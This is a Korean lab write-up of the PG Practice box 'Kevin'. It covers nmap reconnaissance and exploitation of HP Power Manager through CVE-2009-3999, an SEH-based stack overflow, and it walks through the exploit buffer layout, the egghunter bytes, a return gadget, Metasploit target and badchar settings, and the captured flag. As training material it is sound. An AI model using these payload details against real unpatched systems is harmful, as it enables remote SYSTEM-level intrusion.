---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/pwn/bof
  - tech/pwn/seh
  - tech/pwn/egghunter
  - tech/payload/msfvenom
  - tech/enum/searchsploit
type: machine
platform: pg
os: windows
ip: 192.168.60.45
ports: [80, 135, 139, 445, 3389, 3573]
services: [http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn, tag-ups-1]
cves: [CVE-2009-3999]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---
PG Practice — Fundamental · 플래그 1/1
타겟 192.168.60.45 · OS Windows 7 Ultimate N **7600** (RTM, SP 미적용 · 호스트명 `KEVIN`) · 난이도 Fundamental
경로 요약 80번 **GoAhead WebServer / HP Power Manager** 식별 → **CVE-2009-3999** `formExportDataLogs`의 `fileName` SEH 기반 스택 오버플로우 → 공개 python2 PoC + 직접 만든 msfvenom bind shell 셸코드 → 에그헌터가 `Accept:` 헤더의 셸코드를 찾아 실행 → 곧바로 `nt authority\system`
플래그 `C:\Users\Administrator\Desktop\proof.txt` = `4b506d7e0c989b3b7053f9081881a8d3`
**권한상승 단계 없음** — 익스플로잇이 처음부터 SYSTEM을 준다

색인 정정 — CVE 번호와 태그를 바로잡았다
이 박스를 다루는 자료 상당수가 CVE-2009-2685를 인용하는데 그건 다른 취약점이다.
NVD 원문 대조 결과:
- CVE-2009-3999 = `goform/formExportDataLogs`의 `fileName` 파라미터 스택 오버플로우 → 이 박스가 이것이다. Metasploit `exploit/windows/http/hp_power_manager_filename`
- CVE-2009-2685 = 로그인 폼의 `Login` 변수 스택 오버플로우 → `exploit/windows/http/hp_power_manager_login` (ZDI-09-081). 무관
- CVE-2009-4000 = 같은 `formExportDataLogs`의 `fileName` 디렉터리 트래버설. 파라미터 이름이 같아 헷갈리기 쉽다. 무관

또 기존 frontmatter에는 `tech/payload/msfvenom` 하나만 달려 있었다. 실제로 쓴 기법은 SEH 오버플로우 · 에그헌터 · msfvenom · 검색 기반 익스플로잇 발굴이다.

frontmatter의 `cves:` 목록을 믿지 마라. `extract.py`가 본문에서 `CVE-\d{4}-\d{4,7}` 정규식으로 긁어오므로, "이 박스가 아니다"라고 설명하려고 적은 번호까지 함께 들어간다. `manual_tags: true`는 `tech/*` 태그만 막고 `cves`는 막지 못한다.
**이 박스의 CVE는 CVE-2009-3999 하나다.**

## 0. 이 박스에서 배우는 것

- SEH 기반 오버플로우의 구조 — 리턴 주소를 덮는 고전형이 아니다. 예외 핸들러 체인을 덮고, `POP/POP/RET` 가젯으로 실행을 되돌리고, `nSEH`의 4바이트 점프로 셸코드 쪽으로 뛴다
- 에그헌터가 왜 필요한가 — 스택 버퍼가 셸코드를 담기엔 좁을 때, **버퍼에는 32바이트 스캐너만 넣고 셸코드는 다른 곳(HTTP `Accept:` 헤더)에 둔다**
- badchar가 왜 그 목록인가 — URL 인코딩이 아니라 **셸코드가 실리는 위치의 파서**가 결정한다. 여기서는 HTTP 헤더 파싱이 목록의 근거다
- msfvenom 명령 한 줄의 오류가 어떻게 조용히 넘어가는가 — `-e`를 빼먹어도, bind 페이로드에 `LHOST`를 줘도, badchar를 `\x5`로 잘못 써도 **msfvenom은 에러를 내지 않는다.** 출력을 읽어서 알아채야 한다 (6장 ①②③)
- 하드코딩된 리턴 주소가 왜 다른 OS에서도 먹히는가 — 가젯이 OS DLL이 아니라 **애플리케이션 자기 자신(`DevManBE.exe`)**에서 왔기 때문
- **⚠️ OSCP 제약**: Metasploit 모듈을 쓰면 **1대 한정 카드**를 소모한다. 이 박스는 공개 PoC + msfvenom으로 카드를 아끼고 푸는 정석 사례다 (7장)

시험 출제 가능성

| 요소 | 시험 출제 가능성 | 이유 |
|---|---|---|
| HP Power Manager 자체 | 낮음 | 2009년 CVE, 단종 제품 |
| SEH 오버플로우 개념 이해 | 높음 | OSCP 커리큘럼에 스택 오버플로우가 있고, 실전 공개 PoC의 상당수가 SEH형이다. 직접 개발까지는 아니어도 PoC를 읽고 고칠 수 있어야 한다 |
| 셸코드만 갈아끼워 공개 PoC 재활용 | 매우 높음 | 시험에서 가장 자주 하는 작업이다. 익스플로잇을 처음부터 쓰는 일은 거의 없다 |
| badchar를 지켜 msfvenom 셸코드 생성 | 매우 높음 | 한 글자만 틀려도 조용히 실패한다 |
| 낡은 Windows + 낡은 서드파티 웹 서비스 | 매우 높음 | Win7/2008R2 + GoAhead·HFS·Rejetto·Sync Breeze 계열은 시험 단골 |

변형은 이런 모습이다 — Sync Breeze, Savant, Icecast, Easy File Sharing Web Server, SLMail. **원리는 동일하다: 서드파티 서비스 + 공개 PoC + 셸코드 교체.**

이 노트의 1차 기록 범위
Kali(`10.44.44.128`)의 `~/PG/Kevin/` 및 `~/Kevin/` 디렉터리는 현재 존재하지 않는다. nmap 로그·PoC 사본·중간 스크립트가 남아 있지 않다.
따라서 **아래의 터미널 출력은 전부 기존 노트 본문에 보존돼 있던 원문**이고, 그 밖의 명령은 재현하지 않았으므로 적지 않았다.
익스플로잇 코드·CVE 정보·Metasploit 모듈 원문은 공개 저장소와 벤더 게시판에서 확인한 것이며 출처를 9장에 명시했다.

---

## 1. 정찰

### 1-1. Nmap 원문

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ sudo nmap -sV -sC -p- -O 192.168.60.45
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 01:37 +0000
Nmap scan report for 192.168.60.45
Host is up (0.00033s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.60.45/index.asp
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-06-29T01:09:02
|_Not valid after:  2026-12-29T01:09:02
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-06-30T01:39:01+00:00
|_ssl-date: 2026-06-30T01:39:09+00:00; 0s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
OS details: Microsoft Windows 7 or Windows Server 2008 R2, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 2 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-30T01:39:01
|_  start_date: 2026-06-30T01:09:56
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-29T18:39:01-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:95:5a (VMware)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.97 seconds
```

플래그 해설

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 여기서는 없어도 80이 잡히지만, 3573(HP PM 자체 포트)과 49152~49160(동적 RPC)을 놓친다. 3573은 "이 제품이 정말 돌고 있다"는 교차 근거였다 |
| `-sV` | 버전 탐지 | 이게 없으면 이 박스는 못 푼다. `80/tcp open http`만 나오고 `GoAhead WebServer`가 안 나온다 |
| `-sC` | 기본 NSE 스크립트 | `http-title: HP Power Manager`와 `smb-os-discovery`가 여기서 나온다. 제품명을 준 것이 `http-title`이다 |
| `-O` | OS 판정 | `-A`보다 좁다(traceroute·`--script=default` 없음). 여기서는 `-sC`가 이미 있으니 실질 차이는 traceroute뿐 |
| 없음: `--min-rate` | — | 111.97초 걸렸다. Twiggy는 `--min-rate 5000`으로 같은 전수 스캔을 53초에 끝냈다. 시험이라면 2배 차이가 누적된다 |
| 없음: `-Pn` | — | 이 박스는 ping에 응답해서 문제가 없었다. 응답 안 하는 박스에서는 스캔이 통째로 중단되므로 PG에서는 습관적으로 붙이는 편이 낫다 |

`Not shown: 65523 closed tcp ports (reset)` — 방화벽이 없다
`closed`(RST를 돌려줌)이지 `filtered`(무응답)가 아니다. 호스트 방화벽이 꺼져 있거나 통과 정책이라는 뜻이다.
실전적 함의:
- 리버스셸이 나갈 확률이 높다. ([[Twiggy]]는 반대로 전 포트가 `filtered`였고 실제로 리버스셸이 실패했다)
- 스캔이 빠르다 — RST가 즉시 오므로 타임아웃을 기다리지 않는다
- 바인드 셸도 쓸 수 있다. 이 박스가 정확히 그 경우다 — 타겟이 1234를 열고 우리가 접속했다

**`closed` vs `filtered`는 공격 계획을 바꾸는 정보다.** 스캔 요약 한 줄을 그냥 넘기지 마라.

### 1-2. OS·서비스 판정 — 독립 근거 2개

| 항목 | 근거 ① | 근거 ② | 확정 |
|---|---|---|---|
| OS | `smb-os-discovery`: `Windows 7 Ultimate N 7600` | `rdp-ntlm-info`: `Product_Version: 6.1.7600` | Windows 7 RTM (빌드 7600) |
| 서비스팩 | 빌드 7600 = RTM. SP1은 7601 | `OS CPE: cpe:/o:microsoft:windows_7::-` (`::-` = SP 없음) | SP 미적용 |
| 호스트명 | `commonName=kevin` (RDP 인증서) | `NetBIOS computer name: KEVIN` | `KEVIN` |
| 도메인 | `Workgroup: WORKGROUP` | `NetBIOS_Domain_Name: KEVIN` (= 자기 자신) | 도메인 미가입 단독 호스트 |
| 웹 앱 | `http-server-header: GoAhead-Webs` | `http-title: HP Power Manager` | HP Power Manager (GoAhead 임베드) |

`-O`의 `OS details`는 버리고 SMB/RDP 스크립트를 봐라
nmap의 스택 지문은 `Windows 7 or Windows Server 2008 R2, ... Vista SP0 or SP1, ... Windows 7 SP1`을 전부 나열했다 — 범위가 너무 넓어 쓸 수 없다.
반면 `smb-os-discovery`와 `rdp-ntlm-info`는 호스트가 스스로 말한 정확한 빌드 번호를 준다. Windows 박스에서는 이 둘이 항상 우선한다.
이것이 누적 규율 **"버전 판정은 독립 근거 2개"**([[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]])의 Windows 판이다.

**빌드 7600(SP 미적용)이 뜻하는 것**: 2009년 RTM 그대로다. 2010년 이후의 패치가 하나도 없다는 뜻이고, 설치된 서드파티 앱도 같은 시기에 멈춰 있을 가능성이 매우 높다. 실제로 HP Power Manager가 2009년 CVE에 취약했다.

### 1-3. 포트 3573 — `tag-ups-1?`이 교차 근거를 준다

```
3573/tcp  open  tag-ups-1?
```

물음표는 nmap이 확신하지 못했다는 표시다(포트 번호로 IANA 목록을 조회했을 뿐 배너로 확인하지 못함). 하지만 이름이 결정적이다 — `tag-ups-1`의 `ups`는 무정전 전원장치(Uninterruptible Power Supply)이고, **HP Power Manager는 정확히 UPS 관리 소프트웨어**다. 80번의 `http-title: HP Power Manager`와 완전히 일치한다.

즉 3573은 HP PM의 에이전트/관리 포트다 `[가정]` — 배너로 직접 확인하지는 못했다. 확정할 필요도 없었다. **공격면은 80번 웹 인터페이스였다.**

`서비스이름?` 형태의 nmap 출력을 읽는 법
물음표는 "이 포트 번호에 등록된 이름은 이거지만 확인은 못 했다"는 뜻이다.
1. 그 이름을 다른 포트에서 얻은 정보와 대조한다 — 여기서는 `ups` ↔ `HP Power Manager`
2. 맞으면 버전 판정의 두 번째 근거가 된다
3. 안 맞으면 `nc -nv <ip> <port>`로 배너를 직접 받아본다

반대로 [[Osaka]]에서는 `fingerprint-strings`가 통째로 뜨는 미확인 서비스가 커스텀 바이너리 = 메모리 손상 후보 신호였다. **미확인 포트는 정보가 없는 게 아니라 다른 종류의 정보다.**

### 1-4. 다른 포트를 왜 파지 않았는가

| 포트 | 왜 접었는가 |
|---|---|
| 445 SMB | `account_used: guest`는 nmap이 guest로 붙었다는 뜻이지 익명 공유가 있다는 뜻이 아니다. `message_signing: disabled`는 릴레이 공격 조건이지만 단독 워크그룹 호스트라 릴레이할 상대가 없다. Win7 7600은 MS17-010(EternalBlue) 후보이긴 하나 Metasploit 카드를 소모한다 |
| 3389 RDP | 자격증명이 없다. 무차별 대입은 계정 잠금 위험 + 시간 낭비 |
| 135/49152~ | 익명 RPC 열거(`rpcclient -U ""`)는 시도할 가치가 있으나, 80번이 훨씬 명확한 단서를 이미 줬다 |

**판단 기준: 제품명 + 버전이 특정된 서비스가 있으면 그것을 먼저 판다.** `HP Power Manager`는 검색어가 완전히 특정되는 이름이고, 2009년 제품이라 공개 익스플로잇이 있을 확률이 높았다.

---

## 2. 취약점 분석 — CVE-2009-3999

### 2-1. 배경 ① — GoAhead의 `/goform/` 라우팅

GoAhead WebServer는 임베디드 기기용 초경량 C 웹 서버다. 프린터·라우터·UPS 관리 카드에 흔하다. **동적 처리를 CGI가 아니라 서버 프로세스 안의 C 함수로 직접 한다.**

```c
/* 애플리케이션이 핸들러를 등록한다 (GoAhead 2.x 규약) */
websFormDefine("formExportDataLogs", handler_function);
```

등록하면 `POST /goform/formExportDataLogs`가 그 C 함수로 바로 들어간다. GoAhead 현행 소스에도 레거시 별칭이 남아 있다:

```c
/* src/goahead.h */
#define websFormDefine websDefineAction
```

**보안 관점에서 이 구조가 뜻하는 것:**

| 특성 | 결과 |
|---|---|
| 핸들러가 서버 프로세스 내부에서 돈다 | 별도 CGI 프로세스가 없다 → 오버플로우 하나가 웹 서버 전체의 프로세스 권한을 준다 |
| 순수 C, 스크립트 언어 아님 | `strcpy`/`sprintf` 계열의 메모리 손상이 곧바로 코드 실행이 된다 |
| 임베디드 지향 → 스택 버퍼가 작다 | 셸코드를 담을 공간이 없다 → 에그헌터가 필요해진다(2-4) |
| `/goform/<이름>` 경로가 곧 함수 이름 | 핸들러 이름이 그대로 공격 표면 목록이다 |

`/goform/`을 보면 GoAhead다 — 그리고 임베디드 C 핸들러다
같은 계열의 라우팅 지문:

| 경로 패턴 | 서버 | 함의 |
|---|---|---|
| `/goform/<name>` | GoAhead WebServer | C 함수 핸들러. 메모리 손상 후보 |
| `/cgi-bin/<name>.cgi` | 범용 CGI | Shellshock · 명령 주입 후보 |
| `/HNAP1/` | D-Link 등 | 인증 우회 계열 CVE 다수 |
| `/boaform/` | Boa WebServer | GoAhead와 같은 임베디드 계열 |
| `.asp` + `GoAhead-Webs` 헤더 | GoAhead의 자체 ASP 구현 | Microsoft IIS ASP가 아니다. IIS 취약점을 찾으면 헛수고 |

nmap의 `Requested resource was http://192.168.60.45/index.asp`가 정확히 그 마지막 줄이 말하는 함정이다. `.asp`를 보고 IIS/ASP 계열을 뒤졌다면 시간을 태웠을 것이다. **`Server: GoAhead-Webs` 헤더가 진짜 근거**다.

### 2-2. 취약점 원문 — 벤더 어드바이저리와 NVD

NVD CVE-2009-3999 원문:

> Stack-based buffer overflow in goform/formExportDataLogs in HP Power Manager before 4.2.10 allows remote attackers to execute arbitrary code via a long fileName parameter.

CVSSv2 **10.0** `(AV:N/AC:L/Au:N/C:C/I:C/A:C)` — 최고점이다. 벡터를 읽으면 공격 조건이 전부 나온다:

| 벡터 | 값 | 의미 |
|---|---|---|
| `AV:N` | Network | 원격 |
| `AC:L` | Low | 특별한 조건 불필요 |
| `Au:N` | None | 인증 불필요 (pre-auth) ← 가장 중요 |
| `C:C / I:C / A:C` | Complete | 기밀성·무결성·가용성 완전 장악 |

**HP 벤더 게시판 원문** (HPSBMA02485 / SSRT090252, 2010-01-19):

```
Potential Security Impact: Remote execution of arbitrary code
References: CVE-2009-3999, CVE-2009-4000

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP Power Manager earlier than v4.2.10

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2009-3999    (AV:N/AC:L/Au:N/C:C/I:C/A:C)       10.0
CVE-2009-4000    (AV:N/AC:L/Au:N/C:C/I:C/A:C)       10.0
===========================================================

RESOLUTION
HP has made the following available to resolve the vulnerabilities.
HP Power Manager 4.2.10 or subsequent
```

**영향 범위: 4.2.10 미만 전부. 수정 버전: 4.2.10.** 발견자는 Secunia Research의 Alin Rad Pop이고, Secunia 어드바이저리(SA-2009-47)가 원인을 한 줄로 말한다:

> The vulnerability is caused due to a boundary error when processing parameters sent to the /goform/formExportDataLogs URL. This can be exploited to cause a stack-based buffer overflow via an overly long "fileName" parameter.

### 2-3. 왜 취약한가 — 데이터 흐름

**취약 컴포넌트는 `DevManBE.exe`**다. HP Power Manager의 웹 서버 프로세스 본체이고 GoAhead를 임베드하고 있다. Metasploit 모듈이 리턴 가젯의 출처를 명시적으로 이 파일로 지목한다.

Metasploit 모듈 설명이 오버플로우 지점을 이렇게 기술한다:

> a stack-based buffer overflow occurs due to a long error message (which contains the fileName)

**즉 `fileName`을 스택 버퍼에 직접 복사하는 게 아니라, `fileName`을 끼워 넣은 에러 메시지를 포맷하는 과정에서 고정 크기 스택 버퍼가 넘친다.**

```
POST /goform/formExportDataLogs
  fileName = "AAAA...(751바이트 이상)"
  actionType = "1;"          ← 비정상 값 → 에러 경로 유발 [가정]
        │
        ▼
  handler_formExportDataLogs()   (DevManBE.exe 내부)
        │
        ├─ actionType 검증 실패 → 에러 처리 분기
        │
        ▼
  char errbuf[N];                            ← 고정 크기 스택 버퍼
  sprintf(errbuf, "...%s...", fileName);     ← 길이 검사 없음  ★ 여기서 넘침
        │
        ▼
  ┌──────────── 스택 ────────────┐
  │ errbuf[N]                    │  ← A로 채워짐
  │ ...                          │
  │ nSEH   (다음 핸들러 포인터)  │  ← EB C2 90 90 으로 덮임
  │ SEH    (핸들러 함수 포인터)  │  ← 0x004174d5 로 덮임
  └──────────────────────────────┘
```

`[가정]` 표시가 붙은 부분
- 함수명·실제 `sprintf` 호출 위치·버퍼 크기 `N`은 확인하지 못했다. 디스어셈블 수준의 1차 분석 자료를 찾지 못했고, 위 의사코드는 Metasploit 모듈 설명("긴 에러 메시지가 fileName을 포함해 넘친다")을 코드 형태로 옮긴 것이다
- `actionType=1;`이 에러 경로를 유발한다는 인과도 추론이다. PoC와 MSF 모듈이 둘 다 이 비정상 값을 고정으로 보낸다는 사실이 근거다

**확정된 것은 "`fileName`이 길면 스택이 넘치고 SEH가 덮인다"까지다.** 그 이상은 표시를 달았다.

### 2-4. SEH 기반이다 — 리턴 주소 덮어쓰기가 아니다

**이 구분이 이 박스 학습의 핵심이다.** 근거 세 가지가 전부 일치한다:

1. Metasploit 모듈의 주석: `# SEH (strip the null byte, HP PM will pad it for us)`
2. 리턴 주소로 쓰는 가젯이 `pop esi # pop ebx # ret 10` — 전형적 POP/POP/RET
3. 그 바로 앞 4바이트가 `\xeb\xc2\x90\x90` — nSEH에 놓는 short jump

SEH(Structured Exception Handling)가 무엇인가. Windows는 스레드마다 예외 핸들러 체인을 스택 위에 둔다. 각 노드는 8바이트다:

```
 ┌──────────────────────────────┐
 │ nSEH : 다음 노드의 주소      │  4바이트
 ├──────────────────────────────┤
 │ SEH  : 핸들러 함수 포인터    │  4바이트
 └──────────────────────────────┘
```

스택을 넘치게 하면 이 8바이트도 덮인다. 그리고 오버플로우 자체가 예외를 일으키므로(스택 쿠키 검사 실패, 잘못된 포인터 역참조 등) Windows가 곧바로 예외 처리 경로로 들어가 우리가 덮어쓴 `SEH` 주소로 점프한다.

여기서 문제가 하나 있다. 예외 디스패처가 핸들러를 호출할 때 우리가 통제하는 데이터의 주소는 레지스터가 아니라 스택 위(ESP+8)에 있다. 그래서 그냥 `jmp esp` 같은 걸 쓸 수 없다.

**해법이 POP/POP/RET이다:**

```
예외 발생 → 디스패처가 SEH 주소(0x004174d5)로 점프
            이때 스택: [ESP+0]=? [ESP+4]=? [ESP+8]=nSEH의 주소

0x004174d5:  pop esi      ; 스택 4바이트 버림
             pop ebx      ; 스택 4바이트 더 버림   → ESP가 이제 nSEH를 가리킴
             ret 0x10     ; ESP가 가리키는 값(=nSEH의 주소)으로 점프
                          ★ 결과: nSEH 위치의 4바이트가 "실행"된다
```

**즉 nSEH 4바이트가 명령어가 된다.** 그래서 거기에 `\xeb\xc2` (`jmp short -62`) + `\x90\x90` (패딩)을 넣는다. 4바이트로 갈 수 있는 거리는 짧으므로 뒤가 아니라 앞으로(음수) 점프해서 미리 배치해둔 NOP 슬레드로 되돌아간다.

고전형 vs SEH형 — 무엇을 보고 구분하는가

| | 리턴 주소 덮어쓰기 (고전형) | SEH 덮어쓰기 |
|---|---|---|
| 덮는 대상 | 함수의 저장된 EIP | 예외 핸들러 체인(nSEH+SEH) |
| 필요한 가젯 | `jmp esp` / `call esp` | `pop / pop / ret` |
| 착지 지점 | 대개 덮어쓴 곳 바로 뒤 | nSEH(4바이트) → 앞으로 점프 |
| PoC에서의 지문 | `"\x90"*N + shellcode` 뒤에 주소 | `\xeb\xXX\x90\x90` + 3~4바이트 주소 |
| 우회 대상 | — | SafeSEH / SEHOP |

**PoC를 열었을 때 `\xeb`로 시작하는 4바이트가 주소 앞에 있으면 SEH형이다.** 이 지문 하나로 구조 전체가 읽힌다.

### 2-5. 리턴 주소가 왜 다른 OS에서도 먹히는가

Metasploit 모듈의 `Targets` 블록:

```ruby
'Targets' => [
  [
    # Tested on HP Power Manager 4.2 (Build 7 and 9)
    'Windows XP SP3 / Win Server 2003 SP0',
    {
      'Ret' => 0x004174d5, # pop esi # pop ebx # ret 10 (DevManBE.exe)
      'Offset' => 721
    }
  ]
],
```

**타겟 문자열은 "Windows XP SP3 / Server 2003"인데 이 박스는 Windows 7 7600이다. 그런데 동작했다.** 이유는 주석이 알려준다 — 가젯이 `DevManBE.exe`에서 왔기 때문이다.

| 가젯 출처 | OS 의존성 | 신뢰도 |
|---|---|---|
| 애플리케이션 자기 자신 (`DevManBE.exe`) | 없음. 앱 버전만 같으면 어느 Windows에서든 같은 주소 | ★★★ |
| 앱이 번들한 서드파티 DLL | 없음 (동일 조건) | ★★★ |
| OS DLL (`kernel32`·`ntdll`·`user32`) | 높음. OS·SP·핫픽스마다 주소가 바뀐다 | ★ |

주소 `0x004174d5`는 `0x00400000`대 — PE 실행 파일의 기본 이미지 베이스다. 이 이미지가 `/DYNAMICBASE`(ASLR) 없이 빌드됐다면 항상 같은 주소에 로드된다 `[가정 — /DYNAMICBASE 미적용을 직접 확인하지 못했다]`. 2009년 제품이므로 ASLR 미적용이 자연스럽고, Windows 7에서 실제로 동작한 것이 경험적 증거다.

익스플로잇을 고를 때 리턴 주소의 출처를 먼저 봐라
주석에 애플리케이션 이름이나 앱 번들 DLL이 적혀 있으면 → **OS가 달라도 될 확률이 높다.** 이 박스가 그 경우다.
`kernel32.dll`·`ntdll.dll`이 적혀 있으면 → **정확한 OS·SP가 맞아야 한다.** 안 맞으면 주소를 직접 찾아야 하고(`!mona modules` → `!mona seh`), 그건 디버거를 붙일 수 있을 때만 가능하다.
**시험장에서는 앱 기반 가젯 익스플로잇이 훨씬 안전한 선택**이다.

### 2-6. 에그헌터 — 버퍼가 좁을 때의 표준 해법

**문제**: 스택 버퍼가 셸코드(352바이트)를 담기엔 좁다. nSEH 앞의 공간에 NOP + 셸코드를 다 넣을 수 없다.

**해법**: 버퍼에는 32바이트짜리 스캐너(에그헌터)만 넣고, 셸코드는 프로세스 메모리 어딘가 다른 곳에 둔다. 여기서는 HTTP `Accept:` 헤더다. 에그헌터가 메모리를 훑어 4바이트 태그(`b33f`)가 연속 두 번 나오는 곳을 찾고, 그 바로 뒤로 점프한다.

PoC의 에그헌터 32바이트를 명령어로 풀면:

```
66 81 ca ff 0f     or   dx, 0x0fff        ; 페이지 경계로 정렬 (edx |= 0xfff)
42                 inc  edx               ; 다음 주소
52                 push edx               ; 저장
6a 02              push 2
58                 pop  eax               ; eax = 2 (NtAccessCheckAndAuditAlarm)
cd 2e              int  0x2e              ; 시스템 콜  ★ 핵심
3c 05              cmp  al, 5             ; STATUS_ACCESS_VIOLATION 인가?
5a                 pop  edx               ; 복원
74 ef              je   <위로>            ; 접근 불가 페이지면 건너뛴다
b8 62 33 33 66     mov  eax, 0x66333362   ; "b33f"  ← 태그
89 d7              mov  edi, edx
af                 scasd                  ; [edi]와 eax 비교, edi += 4
75 ea              jne  <위로>
af                 scasd                  ; 한 번 더 (b33fb33f 연속 2회 확인)
75 e7              jne  <위로>
ff e7              jmp  edi               ; ★ 셸코드로 점프
```

**핵심 트릭 두 가지:**

1. **`int 0x2e`로 페이지 유효성을 검사한다.** 메모리를 그냥 읽으면 매핑 안 된 페이지에서 크래시한다. 그래서 커널에 주소를 넘기고 커널이 대신 확인하게 한다 — 유효하지 않으면 시스템 콜이 `STATUS_ACCESS_VIOLATION`(0x05)을 돌려줄 뿐 프로세스는 죽지 않는다. skape의 고전 기법이다
2. **태그를 두 번 반복시킨다** (`b33fb33f`). 한 번만 찾으면 에그헌터 자기 안에 있는 `b8 62 33 33 66`(태그 상수)를 자기가 발견해 버린다. 두 번 연속을 요구하면 셸코드 앞의 진짜 태그만 걸린다

에그헌터가 필요한지 판단하는 기준
1. **덮어쓸 수 있는 버퍼 크기 < 셸코드 크기** → 에그헌터
2. **셸코드를 다른 필드/헤더로도 보낼 수 있다** → 에그헌터가 성립
3. 둘 다 아니면 → 스테이저(`shell_bind_tcp` 대신 `shell/bind_tcp` 같은 2단계 페이로드)

대가는 속도다. 에그헌터는 프로세스 메모리 전체를 훑으므로 수 초에서 수십 초가 걸린다. PoC가 `time.sleep(30)`을 두고 저자가 "안 되면 60으로 올려라"고 주석을 단 이유가 이것이다.

### 2-7. 페이로드 조립 — 바이트 단위 지도

PoC가 만드는 버퍼:

```python
buffer  = "\x41" * (721 - len(hunter))   # 721 - 32 = 689
buffer += "\x90"*30 + hunter             # NOP 30 + 에그헌터 32
buffer += "\xeb\xc2\x90\x90"             # JMP SHORT 0xC2
buffer += "\xd5\x74\x41"                 # pop esi # pop ebx # ret 10 (DevManBE.exe)
```

**오프셋 지도** (직접 계산):

```
오프셋      크기   내용                        역할
─────────────────────────────────────────────────────────────────────
    0 ..  688   689   'A' × 689                 패딩
  689 ..  718    30   \x90 × 30                 NOP 슬레드 ← 여기로 착지한다
  719 ..  750    32   에그헌터                   셸코드를 찾아 점프
  751 ..  754     4   EB C2 90 90               nSEH  ★ 여기가 "실행"된다
  755 ..  757     3   D5 74 41                  SEH   (0x004174d5의 하위 3바이트)
```

**세 가지를 짚어야 한다:**

**① `Offset => 721`은 nSEH까지의 거리가 아니다.** 실제 nSEH는 751바이트 지점이다. 721은 "패딩 + NOP + 에그헌터"의 합이고, 코드가 `721 - len(hunter)`로 패딩을 정하므로 에그헌터 길이가 얼마든 합계는 항상 721이 된다. 그 뒤에 NOP 30이 더해져 751이 된다.

> [!danger] PoC의 `Offset` 변수를 "EIP/SEH까지의 거리"로 착각하지 마라
> 익스플로잇마다 `offset`이 무엇을 세는지 다르다. **패턴을 직접 만들어 확인하는 것이 유일하게 확실한 방법**이다:
> ```bash
> msf-pattern_create -l 1000
> msf-pattern_offset -l 1000 -q <크래시 시점의 SEH 값>
> ```
> 이 박스에서는 PoC가 이미 맞춰 놨으므로 계산할 필요가 없었지만, 오프셋이 안 맞아 실패했을 때 어디를 고쳐야 하는지 알려면 구조를 이해하고 있어야 한다.

**② `\xeb\xc2` = `jmp short -62`.** `0xC2`를 부호 있는 8비트로 읽으면 `-62`다. 점프 명령이 끝난 지점(751+2=753)에서 62를 빼면 691 — NOP 슬레드(689~718) 한가운데다. 슬레드를 타고 719의 에그헌터로 들어간다.

**③ SEH 주소를 3바이트만 쓴다.** `0x004174d5`는 리틀엔디언으로 `d5 74 41 00`이고 마지막이 널 바이트다. 널은 문자열을 끊으므로 보낼 수 없다. 그래서 `\xd5\x74\x41` 3바이트만 보낸다 — 나머지 널은 대상 애플리케이션이 알아서 채운다. Metasploit 모듈 주석이 이걸 명시한다:

```ruby
buffer << [target.ret].pack('V*')[0, 3] # SEH (strip the null byte, HP PM will pad it for us)
```

`.pack('V*')`가 리틀엔디언 4바이트로 만들고 `[0, 3]`이 앞 3바이트만 자른다. **"마지막 바이트가 널인 주소는 문자열 끝에 두면 3바이트로 보낼 수 있다"는 것이 오버플로우 익스플로잇의 표준 요령**이다.

### 2-8. badchar가 왜 그 목록인가 — 셸코드가 실리는 위치가 결정한다

Metasploit 모듈의 정본:

```ruby
'Payload' => {
  'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
  'DisableNops' => true,
  'EncoderOptions' => { 'BufferRegister' => 'EDI' } # Egghunter jmp edi
},
```

